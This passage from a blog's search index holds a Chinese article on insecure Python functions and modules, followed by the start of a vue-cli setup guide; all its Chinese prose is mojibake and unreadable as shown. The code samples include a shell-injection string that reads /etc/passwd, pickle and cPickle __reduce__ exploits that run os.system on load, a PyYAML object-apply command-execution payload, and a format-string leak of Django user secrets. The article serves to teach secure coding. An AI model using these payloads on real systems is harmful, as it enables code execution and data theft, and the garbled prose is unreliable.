å¯è§ä½¿ç”¨é™åˆ¶å¾ˆå¤§ï¼Œè¿˜éœ€è¦ä¸€å®šçš„æƒé™ã€‚é¦–å…ˆï¼Œæ–‡ä»¶åç¼€æ²¡æœ‰é™åˆ¶ï¼Œå…¶æ¬¡ä¸Šä¼ è·¯å¾„æ²¡æœ‰é™åˆ¶ï¼Œtemplatetagsç›®å½•å·²çŸ¥ï¼Œå¦å¤–è¿˜éœ€è¦æœ‰viewä½¿ç”¨è¿™ä¸ªæ¨¡æ¿ã€‚ å¦å¤–xmlå’Œhtmlæ–‡ä»¶çš„è‡ªç”±ä¸Šä¼ ä¾ç„¶å¯ä»¥é€ æˆxxeå’Œxssã€‚ æ–‡ä»¶åŒ…å« æ¡ˆä¾‹ ç›¸æ¯”ä¹‹ä¸‹æ–‡ä»¶åŒ…å«æ¯”phpå°‘å¾—å¤š é‡å®šå‘ djangoåœ¨ä»Šå¹´çˆ†å‡ºäº†ä¸¤ä¸ªé‡å®šå‘æ¼æ´CVE-2017-7233&amp;7234å…¶ä¸­çš„CVE-2017-7233ä¸urlparseæœ‰å…³ï¼Œæ¼æ´çš„è¯´æ˜å¯æŸ¥çœ‹ä¸‹æ–‡ã€‚ ä¸å®‰å…¨æ¨¡å—åŠå‡½æ•° å†…å»ºå‡½æ•° input(): python input() ç›¸ç­‰äº eval(raw_input(prompt)) ï¼Œç”¨æ¥è·å–æ§åˆ¶å°çš„è¾“å…¥,åœ¨python3.0ä»¥åçš„ç‰ˆæœ¬ä¸­å–æ¶ˆraw_input,å¹¶ç”¨inputä»£æ›¿. 12value &#x3D; input(&quot;hello &quot;)print(&quot;welcome %s&quot; % (value,)) python2å‘½ä»¤è¡Œä¸‹ï¼š 12hello dir()welcome [&#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__name__&#39;, &#39;__package__&#39;] python3å‘½ä»¤è¡Œä¸‹: 12hello dir()welcome dir() assert(): assertæ–­è¨€æ˜¯å£°æ˜å…¶å¸ƒå°”å€¼å¿…é¡»ä¸ºçœŸçš„åˆ¤å®šï¼Œå¦‚æœå‘ç”Ÿå¼‚å¸¸å°±è¯´æ˜è¡¨è¾¾ç¤ºä¸ºå‡ã€‚ 1234Traceback (most recent call last): File &quot;&#x2F;Users&#x2F;mapl0&#x2F;Desktop&#x2F;èµ„æ–™&#x2F;sec.py&quot;, line 3, in &lt;module&gt; assert os.system(&#39;touch test&#39;)AssertionError æŠ¥äº†ä¸ªé”™è¯¯ï¼Œä½†testæ–‡ä»¶å·²è¢«å»ºç«‹ ä»£ç æ‰§è¡Œå‡½æ•° eval:è®¡ç®—å­—ç¬¦ä¸²ä¸­çš„è¡¨è¾¾å¼ exec:æ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„è¯­å¥ execfile:ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶#python3ä¸­å·²æ— æ­¤å‡½æ•° 1234a &#x3D; &quot;print(&#39;eval:hello&#39;)&quot;b &#x3D; &quot;print(&#39;exec:hello&#39;)&quot;eval(a)exec(b) python2å’Œpython3ä¸‹ç»“æœä¸€æ · eval:hello exec:hello execfile(â€˜temp.binâ€™)#temp.binå†…å®¹ä¸ºprint(â€˜execfile:helloâ€™) ç»“æœ execfile:hello osæ¨¡å—: os.system os.popen#å’Œos.systemçš„åŒºåˆ«åœ¨äºpopenä¼šæŠŠå‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¿”å›å€¼ os.spawn os.execå®¶æ— commandsæ¨¡å— : 1commands.getstatusoutput subprocessæ¨¡å— : subprocess.Popen subprocess.callé€šè¿‡å­è¿›ç¨‹è¿›è¡Œå¤–å£³æ³¨å…¥ 1234from subprocess import callunvalidated_input &#x3D; &#39;&#x2F;bin&#x2F;true&#39;#trueå‘½ä»¤å•¥éƒ½ä¸åš,åªè®¾ç½®é€€å‡ºç ä¸º0unvalidated_input +&#x3D; &#39;; cut -d: -f1 &#x2F;etc&#x2F;passwd&#39;call(unvalidated_input, shell&#x3D;True)#å½“shell&#x3D;trueæ—¶ï¼Œshellå‘½ä»¤å¯è¢«å½“åšå¤šå¥æ‰§è¡Œã€‚ è¿è¡Œç»“æœ â€‹ nobody â€‹ root â€‹ â€¦â€¦.. multiprocessingå¤šè¿›ç¨‹æ¨¡å— : 1234import multiprocessingp &#x3D; multiprocessing.Process(target&#x3D;print, args&#x3D;(&quot;hello&quot;))#targetå‚æ•°ä¸ºå‡½æ•°åï¼Œargsä¸ºå‡½æ•°æ‰€éœ€å‚æ•°p.start()p.join() è¿è¡Œç»“æœ h e l l o pty : åªèƒ½åœ¨linuxmacä¸‹ä½¿ç”¨çš„ä¼ªç»ˆç«¯ 12import ptypty.spawn(&#39;ls&#39;) åœ¨python23ä¸‹å‡å¯æ‰§è¡Œå‘½ä»¤ å…¶ä»–æœ‰å®‰å…¨é—®é¢˜æ¨¡å—åŠå‡½æ•° codecs : codecsä½œç”¨äºå„ç§ç¼–ç ä¹‹é—´çš„ç›¸äº’è½¬æ¢ 12345678910import codecsimport iob &#x3D; b&#39;x41xF5x42x43xF4&#39;print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))with open(&#39;temp.bin&#39;, &#39;wb&#39;) as fout: fout.write(b)with codecs.open(&#39;temp.bin&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin: print(&quot;CODECS-String %r&quot;) % (repr(fin.read()))with io.open(&#39;temp.bin&#39;, &#39;rt&#39;, encoding&#x3D;&#39;utf8&#39;, errors&#x3D;&#39;replace&#39;) as fin: print(&quot;IO-String %r&quot;) % (repr(fin.read())) å½“bä»¥äºŒè¿›åˆ¶æ–¹å¼å†™å…¥æ–‡ä»¶åï¼Œç”¨codecsåœ¨è¿›è¡Œè¯»å–ï¼Œå¦‚æœerrors=â€™replaceâ€™ä¸”ç¼–ç å½¢å¼ä¸ºutf-8æ—¶ï¼Œåˆ™å¯¹äºxF5å’ŒxF4è¿™ç±»ä¸èƒ½ç¼–ç çš„éƒ½ä¼šè¢«æ›¿æ¢ä¸ºufffdã€‚ åœ¨python2ä¸‹ï¼š 123Correct-String &quot;u&#39;A\\ufffdBC\\ufffd&#39;&quot;CODECS-String &quot;u&#39;A\\ufffdBC&#39;&quot;IO-String &quot;u&#39;A\\ufffdBC\\ufffd&#39;&quot; åœ¨Python3ä¸‹ä¼šæŠ¥é”™ï¼š 12print(&quot;Correct-String %r&quot;) % ((repr(b.decode(&#39;utf8&#39;, &#39;replace&#39;))))TypeError: unsupported operand type(s) for %: &#39;NoneType&#39; and &#39;str&#39; ctypes : ctypesæ˜¯ä¸€ä¸ªæä¾›å’ŒCè¯­è¨€å…¼å®¹çš„æ•°æ®ç±»å‹çš„å¤–éƒ¨åº“ï¼Œå½“å‡ºç°x00çš„ç©ºå­—ç¬¦å°±ä¼šå‡ºç°æˆªæ–­ 12345import ctypesbuffer &#x3D; ctypes.create_string_buffer(8)buffer.value&#x3D;&#39;abx00c1234&#39;print(buffer.value)print (buffer.raw) åœ¨python2å‘½ä»¤è¡Œä¸‹: â€‹ ab â€‹ abc1234 åœ¨python3ä¸‹å›æŠ¥é”™ï¼š 12buffer.value&#x3D;&#39;abx00c1234&#39;TypeError: bytes expected instead of str instance Python Interpreter : 123456789101112131415#!pythontry: if 0: yield 5 print(&quot;T1-FAIL&quot;)except Exception as e: print(&quot;T1-PASS&quot;) passtry: if False: yield 5 print(&quot;T2-FAIL&quot;)except Exception as e: print(repr(e)) pass å¯¹äºç±»ä¼¼if 0: if False: çš„å†™æ³•ï¼Œpythonç‰ˆæœ¬çš„ä¸åŒï¼Œå…¶æµ‹è¯•ç»“æœä¹Ÿä¸åŒ å¯é‡ç”¨æ•´æ•° : 12999+1 is 1000 #False1+1 is 2 #True å¯¹æ­¤çš„è§£é‡Šæ˜¯ï¼ŒPython ç»´æŠ¤äº†ä¸€ä¸ªå¯¹è±¡è¿æ¥æ± ï¼Œå…¶ä¸­ä¿æœ‰å‰å‡ ç™¾ä¸ªæ•´æ•°ï¼Œé‡ç”¨å®ƒä»¬ä¼šèŠ‚çº¦å†…å­˜å’Œå¯¹è±¡çš„åˆ›å»ºã€‚ æµ®ç‚¹æ•°æ¯”è¾ƒ : 12.2 * 3.0 &#x3D;&#x3D; 3.3 * 2.0 #False ç”±äºå›ºæœ‰å—é™ç²¾åº¦ï¼Œä»¥åŠåè¿›åˆ¶ä¸äºŒè¿›åˆ¶å°æ•°è¡¨ç¤ºæ‰€äº§ç”Ÿçš„å·®å¼‚å¯¼è‡´çš„èˆå…¥é”™è¯¯ã€‚ æ— ç©·å¤§ : pythonæ”¯æŒæ— ç©·å¤§çš„æ¦‚å¿µï¼Œä½†åœ¨python2ä¸‹å‡ºç°äº†è¿™æ ·çš„æƒ…å†µ 12345Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.10**1000000 &gt; float(&#39;infinity&#39;)Falsefloat &gt; float(&#39;infinity&#39;)True python3ä¸‹ 123456 10**1000000 &gt; float(&#39;infinity&#39;)False float &gt; float(&#39;infinity&#39;)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: unorderable types: type() &gt; float() builtins : æ­¤æ¨¡å—åœ¨pythonå¯åŠ¨åé¦–å…ˆåŠ è½½åˆ°å†…å­˜ï¼Œæ­¤æ—¶è¿˜æ²¡æœ‰æ‰§è¡Œä»»ä½•ç¨‹åºå‘˜å†™çš„ä»£ç ï¼Œåœ¨Python2.Xç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º__builtin__ï¼Œè€Œåˆ°äº†Python3.Xç‰ˆæœ¬ä¸­æ›´åä¸ºbuiltinsã€‚ åœ¨ Python 2ä¸­ï¼Œ å†…ç½®å¯¹è±¡å¯ä»¥é€šè¿‡é­”æ³• builtins æ¨¡å—è¿›è¡Œè®¿é—®ã€‚ 12345__builtins__.False, __builtins__.True &#x3D; True, False True False int(True) 0 falseè¢«èµ‹å€¼æˆtrueï¼Œtrueè¢«èµ‹å€¼æˆfalse urllib2: Python çš„ urllib åº“æ›¾å‡ºè¿‡ä¸€ä¸ªå¤´æ³¨å…¥çš„æ¼æ´ï¼ŒCVE-2016-5699 å¦‚æœè¯·æ±‚å¤´é‡Œå‡ºç°äº†**%0A**åˆ™ç›´æ¥æ¢è¡Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ³¨å…¥é¢å¤–httpå¤´å’Œè¯·æ±‚æ–¹æ³•ï¼Œå¯åœ¨ssrfé‡Œæ”»å‡»redisæˆ–è€…memcachedã€‚ Python2/Python3è¾ƒæ–°çš„ç‰ˆæœ¬å‡åœ¨å‡ºå£å¤„çš„putheader()å‡½æ•°é‡Œæ·»åŠ äº†ä¸€ä¸ªæ£€éªŒï¼Œå‘ç°ä¸åˆæ³•URLä¼šæŠ¥ä¸€ä¸ªerror. tarfile/ZipFile: tarfileæ¨¡å—å¯ä»¥è¯»å–å’Œå†™å…¥taræ–‡ä»¶ï¼ŒåŒ…æ‹¬ä½¿ç”¨gzipæˆ–bz2å‹ç¼©çš„å‹ç¼©æ–‡ä»¶ã€‚ ZipFileæ¨¡å—æä¾›äº†åˆ›å»ºï¼Œè¯»å–ï¼Œå†™å…¥ï¼Œé™„åŠ å’Œåˆ—å‡ºZIPæ–‡ä»¶çš„å‡½æ•°ã€‚ TarFile.extractallä½¿ç”¨æ­¤å‡½æ•°æå–æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶å¯èƒ½åˆ›å»ºåœ¨å…¶ä»–è·¯å¾„ï¼Œå®˜æ–¹å»ºè®®ä¸è¦ä»ä¸ä¿¡ä»»çš„æ¥æºæå–æ–‡ä»¶ã€‚ ZipFile.extractallä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼Œè§£å‹æ—¶æ–‡ä»¶å¯èƒ½åˆ›å»ºåœ¨å…¶ä»–è·¯å¾„ï¼Œä½†åœ¨2.7.4ç‰ˆæœ¬ä¸­ï¼Œæ¨¡å—ä¼šè¯•å›¾é˜»æ­¢è¿™ç§è¡Œä¸ºã€‚ urlparse : CVE-2017-7233 urllib.parse.urlparseçš„ç‰¹æ®Šæƒ…å†µæ›¾ç»™djangoé€ æˆä¸€ä¸ªurlè·³è½¬æ¼æ´ã€‚ djangoçš„is_safe_urlå‡½æ•°å¯ç”¨äºæ£€æµ‹urlæ˜¯æˆ–å¦å®‰å…¨ï¼Œä½†æ•´åˆå„å‡½æ•°æ˜¯åŸºäºurllib.parse.urlparseçš„ï¼Œurlparseåœ¨å½“schemeä¸ç­‰äºhttpï¼Œpathä¸ºçº¯æ•°å­—æ—¶ä¸èƒ½æ­£å¸¸åˆ†å‰²ä½¿å¾—is_safe_urlä¸ºtrueï¼Œä»è€Œè¾¾åˆ°bypassçš„ç›®çš„ã€‚ ä¾‹å¦‚ https:1029415385ï¼Œis_safe_urlä¼šç›´æ¥åˆ¤æ–­ä¸ºtrueã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´: èµ·å› æ˜¯pythonçš„æ–°æ–¹æ³•formatï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 12345class mapl0: user &#x3D; &#39;mapl0&#39; password &#x3D; &#39;hahaha&#39; key &#x3D; &#39;123456&#39;print(&quot;This is &#123;user.user&#125; &#123;user.password&#125;&quot;.format(user &#x3D; mapl0)) æˆ‘ä»¬å¯ä»¥é€šè¿‡formatå°†mapl0ç±»ä¸­çš„å±æ€§è¾“å‡ºå‡ºæ¥ï¼Œåœ¨è¿™ç¯‡paperä¸­(@phithon)å°±æœ‰ç±»ä¼¼çš„æƒ…å†µï¼š 1234def view(request, *args, **kwargs): user &#x3D; get_object_or_404(User, pk&#x3D;request.GET.get(&#39;uid&#39;)) template &#x3D; &#39;This is &#123;user&#125;&#39;s email: &#39; + request.GET.get(&#39;email&#39;) return HttpResponse(template.format(user&#x3D;user)) ç”±äºrequest.GET.get(â€˜emailâ€™)ä¹Ÿå°±æ˜¯ç”¨æˆ·é€šè¿‡getä¼ å…¥çš„emailå‚æ•°å®Œå…¨å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½è®©request.useré‡Œçš„ä»»æ„å±æ€§è¾“å‡ºå‡ºæ¥ï¼Œä¾‹å¦‚{user.password}ã€‚ é€šè¿‡debugæŸ¥çœ‹äº†ä¸€ä¸‹request.useré‡Œçš„å†…å®¹,å…¶ä¸­session_key,ç›®å½•ï¼Œsecret_keyç­‰ç­‰æ•æ„Ÿä¿¡æ¯éƒ½èƒ½æŸ¥çœ‹ï¼Œå…¶ä¸­SECRET_KEYå¦‚æœæ³„éœ²ï¼Œåˆ™å¯èƒ½é…åˆdjangoååºåˆ—åŒ–æ¼æ´å®ç°rceã€‚ Jinjaçš„æ²™ç›’ç»•è¿‡ä¸æ­¤åŒç†ã€‚é¡ºä¾¿ä¸€è¯´ï¼Œåœ¨paperè¿˜æåˆ°çš„fä¿®é¥°ç¬¦å¾ˆæœ‰æ„æ€ï¼Œåœ¨python3.6ç‰ˆæœ¬ä¼šåï¼Œè¢«f/Fä¿®é¥°çš„å­—ç¬¦ä¸²å°†ä¼šè¢«å½“åšä»£ç æ‰§è¡Œã€‚ ååºåˆ—åŒ– Cpickle/pickle ååºåˆ—åŒ–ï¼š python2 ä½¿ç”¨cPickleï¼Œpython3 ä½¿ç”¨pickleï¼Œ__reduce__å‡½æ•°ä¼šåœ¨è¢«ååºåˆ—åŒ–æ˜¯æ‰§è¡Œï¼Œç±»ä¼¼phpé‡Œçš„__wakeupï¼Œå½“æˆ‘ä»¬åºåˆ—åŒ–äº†ä¸€ä¸ªå¸¦æœ‰__reduce__çš„ç±»æ—¶ï¼Œå°†å…¶ååºåˆ—åŒ–å³å¯æ‰§è¡Œ__reduce__é‡Œçš„ä»£ç  12345678910111213import osimport cPicklea &#x3D; 1# Exploit that we want the target to unpickleclass Exploit(object): def __reduce__(self): global a a &#x3D; 10 os.system(&quot;pwd&quot;) return (os.system, (&#39;ls&#39;,))shellcode &#x3D; cPickle.dumps(Exploit())#cPickle.dumpsåºåˆ—åŒ–æ“ä½œcPickle.loads(shellcode)#cPickle.loadsååºåˆ—åŒ–æ“ä½œprint a pickleç”¨æ³•ç±»ä¼¼ 12345678import osimport pickle# Exploit that we want the target to unpickleclass Exploit(object): def __reduce__(self): return (os.system, (&#39;ls&#39;,))shellcode &#x3D; pickle.dumps(Exploit())pickle.loads(shellcode) Djangoä»»æ„ä»£ç åœ¨django1.6ç‰ˆæœ¬å‰å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…¶æ¼æ´èµ·å› å°±æ˜¯pickleã€‚ åœ¨django1.6ä»¥ä¸‹ï¼Œsessioné»˜è®¤æ˜¯é‡‡ç”¨pickleæ‰§è¡Œåºåˆ—å·æ“ä½œï¼Œåœ¨1.6åŠä»¥ä¸Šç‰ˆæœ¬é»˜è®¤é‡‡ç”¨jsonåºåˆ—åŒ–ï¼Œä½†è¿˜éœ€è¦çŸ¥é“SECRET_KEYä»¥åŠç›®æ ‡é‡‡ç”¨äº†signed_cookiesã€‚ æŒé˜…iReaderæŸç«™Pythonæ¼æ´æŒ–æ˜ï¼Œé€šè¿‡rediså†™sessionä»è€Œååºåˆ—åŒ–getshellã€‚ PyYAML å¯¹è±¡ç±»å‹è§£æå¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œé—®é¢˜ï¼š http://blog.knownsec.com/2016/03/pyyaml-tags-parse-to-command-execution/ 12345import yamlcontent &#x3D; &#39;&#39;&#39;---!!python&#x2F;object&#x2F;apply:subprocess.check_output [[ls]]#subprocess.check_outputçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹å®Œæˆ è¿”å›å­è¿›ç¨‹å‘æ ‡å‡†è¾“å‡ºçš„è¾“å‡ºç»“æœ...&#39;&#39;&#39;print yaml.load(content) python2ä¸‹ç»“æœ 1.py init.py pycache â€¦â€¦ python3ä¸‹ç»“æœ 1b&#39;1.pyn__init__.pyn__pycache__n................ shelveï¼š shelveç”¨å¤„æ˜¯è®©å¯¹è±¡æŒä¹…åŒ–ï¼Œä½†å®ƒåœ¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†pickleæ¨¡å—ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨shelveä¼šè°ƒç”¨çš„pickleåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»£ç ã€‚ 12345678import shelveimport osclass exp(object): def __reduce__(self): return (os.system(&#39;ls&#39;))file &#x3D; shelve.open(&quot;test&quot;)file[&#39;exp&#39;] &#x3D; exp()print(file[&#39;exp&#39;]) ä¸€äº›åœ¨è¾ƒæ–°ç‰ˆæœ¬è¢«å¼ƒç”¨çš„å‡½æ•°å’Œæ¨¡å— rexec: åœ¨python2.6åè¢«å¼ƒç”¨ï¼Œç›¸å…³æ–‡æ¡£. bastion: åœ¨python2.6åè¢«å¼ƒç”¨ï¼Œç›¸å…³æ–‡æ¡£. tempfile.mktemp: æ­¤å‡½æ•°è‡ªä»2.3ç‰ˆæœ¬ä¸æ¨èä½¿ç”¨å¹¶ä½¿ç”¨mkstemp()ä»£æ›¿ï¼Œç›¸å…³æ–‡æ¡£ æ€»ç»“ pythonå®‰å…¨è¿˜è¿œä¸æ­¢ä¸Šæ–‡æ‰€è¿°éƒ¨åˆ†ï¼Œéšä¹‹pythonä½¿ç”¨è€…çš„å¢å¤šï¼Œå…¶å®‰å…¨æ€§å¿…ç„¶ä¹Ÿä¼šä¸æ–­åœ°æ”¶åˆ°æŒ‘æˆ˜ï¼Œè€Œæˆ‘ä»¬ä¹Ÿéœ€è¦ä»ä¸­ä¸æ–­å­¦ä¹ ä»¥åº”å¯¹éšæ—¶è¢­æ¥çš„å¨èƒã€‚ å‚è€ƒæ–‡ç«  http://python.jobbole.com/82746/ http://www.freebuf.com/articles/web/73669.html https://virusdefender.net/index.php/archives/576/ https://paper.seebug.org/337/ http://www.freebuf.com/articles/system/89165.html","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"ç½‘ç»œå®‰å…¨/python","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/python/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"web","slug":"web","permalink":"https://zhangyanlady.github.io/tags/web/"},{"name":"python","slug":"python","permalink":"https://zhangyanlady.github.io/tags/python/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"ç½‘ç»œå®‰å…¨/python","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/python/"}]},{"title":"vueæ­å»º","slug":"vueæ­å»º","date":"2020-09-15T11:17:37.000Z","updated":"2020-09-17T02:26:32.025Z","comments":true,"path":"2020/09/15/vueæ­å»º/","link":"","permalink":"https://zhangyanlady.github.io/2020/09/15/vue%E6%90%AD%E5%BB%BA/","excerpt":"","text":"1. é¿å‘å‰è¨€ç¡®è®¤nodeä¸npmçš„ç‰ˆæœ¬ å°†è¿™ä¸ªæ”¾åœ¨æœ€å‰é¢è¯´æ˜¯å¸Œæœ›å¤§å®¶åœ¨æ­å»ºå‰ï¼Œåº”è¯¥å…ˆç¡®ä¿å°†nodeæ›´æ–°è‡³6ä»¥ä¸Šï¼Œè¿™æ ·èƒ½å°‘èµ°ä¸€äº›å¼¯è·¯ã€‚ä¸‹é¢å¼€å§‹æ­£å¼ä»‹ç»æ•´ä¸ªæ„å»ºè¿‡ç¨‹ã€‚ 2. ä½¿ç”¨ vue-cli æ­å»ºé¡¹ç›®ä¸‹é¢æ•´ä¸ªè¿‡ç¨‹æ˜¯åŸºäºå·²ç»å®‰è£…node.jså’Œcnpmçš„åŸºç¡€ä¸Šï¼Œnode.jså¦‚ä½•å®‰è£…å°±ä¸åœ¨è¿™é‡Œè¯¦è¯´äº†ã€‚å¦‚ä½•å…¨å±€åŒ–å®‰è£…cnpmï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ï¼š 1npm install cnpm -g --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org å…¶å®å¯¹äºå®‰è£…vue-cliï¼Œä½¿ç”¨npmå‘½ä»¤å’Œcnpmå‘½ä»¤éƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸ªäººè§‰å¾—ä½¿ç”¨npmå®‰è£…çš„æ¯”è¾ƒæ…¢ï¼Œè€Œä¸”å¾ˆå¯èƒ½ä¼šå› ä¸ºç½‘ç»œé—®é¢˜è€Œå‡ºé”™ï¼Œæ‰€ä»¥è¿˜æ˜¯è§‰å¾—ä½¿ç”¨cnpmç¨³ä¸€ç‚¹ã€‚ ï¼ˆ1ï¼‰å…¨å±€å®‰è£… vue-cli ï¼Œåœ¨å‘½ä»¤æç¤ºçª—å£æ‰§è¡Œï¼š1cnpm install -g vue-cli å®‰è£…vue-cli å‡ºç°ä»¥ä¸Šæç¤ºè¡¨ç¤ºvue-cliæ­£å¸¸å®‰è£…æˆåŠŸï¼Œå¯ä»¥æ­£å¼åˆ›å»ºvue-cliå·¥ç¨‹é¡¹ç›®äº†ã€‚ ï¼ˆ2ï¼‰å®‰è£…vue-cliæˆåŠŸåï¼Œé€šè¿‡cdå‘½ä»¤è¿›å…¥ä½ æƒ³æ”¾ç½®é¡¹ç›®çš„æ–‡ä»¶å¤¹ï¼Œåœ¨å‘½ä»¤æç¤ºçª—å£æ‰§è¡Œåˆ›å»ºvue-cliå·¥ç¨‹é¡¹ç›®çš„å‘½ä»¤ï¼š1vue init webpack åˆ›å»ºvue-cliå·¥ç¨‹é¡¹ç›® ç¡®è®¤åˆ›å»ºé¡¹ç›®åï¼Œåç»­è¿˜éœ€è¾“å…¥ä¸€ä¸‹é¡¹ç›®åç§°ã€é¡¹ç›®æè¿°ã€ä½œè€…ã€æ‰“åŒ…æ–¹å¼ã€æ˜¯å¦ä½¿ç”¨ESLintè§„èŒƒä»£ç ç­‰ç­‰ï¼Œ ç”Ÿæˆæ–‡ä»¶ç›®å½• ï¼ˆ3ï¼‰ç”Ÿæˆæ–‡ä»¶ç›®å½•åï¼Œä½¿ç”¨ cnpm å®‰è£…ä¾èµ–ï¼š1cnpm install å®‰è£…ä¾èµ– ï¼ˆ4ï¼‰æœ€åéœ€è¦æ‰§è¡Œå‘½ä»¤ï¼š npm run dev æ¥å¯åŠ¨é¡¹ç›®ï¼Œå¯åŠ¨å®Œæˆåä¼šè‡ªåŠ¨å¼¹å‡ºé»˜è®¤ç½‘é¡µï¼šåˆ°è¿™ä¸€æ­¥ï¼Œå°±ç®—æˆåŠŸåˆ©ç”¨vue-cliæ­å»ºä¸€ä¸ªvueé¡¹ç›®äº†ï¼Œæ’’èŠ± ~ 3.ç›®å½•ç»“æ„åŠå…¶å¯¹åº”ä½œç”¨é€šè¿‡vue-cliæ­å»ºä¸€ä¸ªvueé¡¹ç›®ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ç³»åˆ—æ–‡ä»¶ï¼Œè€Œè¿™äº›æ–‡ä»¶å…·ä½“æ˜¯æ€æ ·çš„ç»“æ„ã€æ–‡ä»¶å¯¹åº”èµ·ä»€ä¹ˆä½œç”¨ï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢çš„è§£é‡Šï¼š 12345678910111213141516171819202122232425262728293031â”œâ”€â”€ build&#x2F; # webpack ç¼–è¯‘ä»»åŠ¡é…ç½®æ–‡ä»¶: å¼€å‘ç¯å¢ƒä¸ç”Ÿäº§ç¯å¢ƒâ”‚ â””â”€â”€ ...â”œâ”€â”€ config&#x2F; â”‚ â”œâ”€â”€ index.js # é¡¹ç›®æ ¸å¿ƒé…ç½®â”‚ â””â”€â”€ ...â”œ â”€â”€ node_module&#x2F; #é¡¹ç›®ä¸­å®‰è£…çš„ä¾èµ–æ¨¡å— â”€â”€ src&#x2F;â”‚ â”œâ”€â”€ main.js # ç¨‹åºå…¥å£æ–‡ä»¶â”‚ â”œâ”€â”€ App.vue # ç¨‹åºå…¥å£vueç»„ä»¶â”‚ â”œâ”€â”€ components&#x2F; # ç»„ä»¶â”‚ â”‚ â””â”€â”€ ...â”‚ â””â”€â”€ assets&#x2F; # èµ„æºæ–‡ä»¶å¤¹ï¼Œä¸€èˆ¬æ”¾ä¸€äº›é™æ€èµ„æºæ–‡ä»¶â”‚ â””â”€â”€ ...â”œâ”€â”€ static&#x2F; # çº¯é™æ€èµ„æº (ç›´æ¥æ‹·è´åˆ°dist&#x2F;static&#x2F;é‡Œé¢)â”œâ”€â”€ test&#x2F;â”‚ â””â”€â”€ unit&#x2F; # å•å…ƒæµ‹è¯•â”‚ â”‚ â”œâ”€â”€ specs&#x2F; # æµ‹è¯•è§„èŒƒâ”‚ â”‚ â”œâ”€â”€ index.js # æµ‹è¯•å…¥å£æ–‡ä»¶â”‚ â”‚ â””â”€â”€ karma.conf.js # æµ‹è¯•è¿è¡Œé…ç½®æ–‡ä»¶â”‚ â””â”€â”€ e2e&#x2F; # ç«¯åˆ°ç«¯æµ‹è¯•â”‚ â”‚ â”œâ”€â”€ specs&#x2F; # æµ‹è¯•è§„èŒƒâ”‚ â”‚ â”œâ”€â”€ custom-assertions&#x2F; # ç«¯åˆ°ç«¯æµ‹è¯•è‡ªå®šä¹‰æ–­è¨€â”‚ â”‚ â”œâ”€â”€ runner.js # è¿è¡Œæµ‹è¯•çš„è„šæœ¬â”‚ â”‚ â””â”€â”€ nightwatch.conf.js # è¿è¡Œæµ‹è¯•çš„é…ç½®æ–‡ä»¶â”œâ”€â”€ .babelrc # babel é…ç½®æ–‡ä»¶â”œâ”€â”€ .editorconfig # ç¼–è¾‘é…ç½®æ–‡ä»¶â”œâ”€â”€ .gitignore # ç”¨æ¥è¿‡æ»¤ä¸€äº›ç‰ˆæœ¬æ§åˆ¶çš„æ–‡ä»¶ï¼Œæ¯”å¦‚node_modulesæ–‡ä»¶å¤¹ â”œâ”€â”€ index.html # index.html å…¥å£æ¨¡æ¿æ–‡ä»¶â””â”€â”€ package.json # é¡¹ç›®æ–‡ä»¶ï¼Œè®°è½½ç€ä¸€äº›å‘½ä»¤å’Œä¾èµ–è¿˜æœ‰ç®€è¦çš„é¡¹ç›®æè¿°ä¿¡æ¯ â””â”€â”€ README.md 